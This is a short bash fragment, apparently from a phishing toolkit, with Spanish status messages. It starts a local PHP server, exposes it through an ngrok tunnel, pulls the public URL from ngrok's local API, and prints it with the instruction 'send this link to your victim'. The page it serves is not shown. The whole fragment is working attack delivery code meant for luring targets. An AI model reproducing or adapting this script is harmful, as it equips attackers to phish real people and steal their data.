printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor PHP...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor NGROK...\n"
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a tu victima: \e[0m\e[1;77m %s\e[0m\n" $link
